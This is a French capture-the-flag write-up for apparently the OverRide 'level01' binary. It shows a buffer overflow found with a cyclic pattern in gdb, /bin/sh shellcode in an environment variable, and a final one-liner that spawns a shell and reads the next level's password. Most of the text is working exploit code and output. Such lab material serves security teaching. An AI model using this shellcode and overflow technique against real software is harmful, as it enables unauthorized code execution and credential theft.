# Level1

On observe que l'exécutable lit un input sur l'entrée standard

```shell
$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: Hello World
verifying username....

nope, incorrect username...
```

On regarde l'assembleur et on remarque qu'il compare notre input de `Username` à
`dat_wil`. Ensuite, on voit qu'il segfault si le mot de passe est trop grand.

```shell
$ python -c 'print("dat_wil\n" + "A"*40)' | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

$ python -c 'print("dat_wil\n" + "A"*200)' | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

Segmentation fault (core dumped)
```

On utilise donc wiremask pour trouver l'offset, qui est de 80

```shell
level01@OverRide:~$ gdb level01 -q
Reading symbols from /home/users/level01/level01...(no debugging symbols found)...done.
(gdb) r
Starting program: /home/users/level01/level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()

```

On va mettre notre shellcode dans une variable d'environnement et regarder son adresse

```shell
$ export Shellcode=$(python -c 'print "\x90"*100 +"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80"')

$ gdb level01 -q
Reading symbols from /home/users/level01/level01...(no debugging symbols found)...done.

(gdb) b *main
Breakpoint 1 at 0x80484d0

(gdb) run
Starting program: /home/users/level01/level01

Breakpoint 1, 0x080484d0 in main ()

(gdb) x/s *((char **)environ)
0xffffd860: "Shellcode=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Phn/shh//bi\211\343P\211\341P\211\342\260\v̀"
```

Assemblons toutes les pièces

```shell
$ (python -c 'print("dat_wil\n" + "A"*80 + "\xff\xff\xd8\x80"[::-1])'; cat) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```
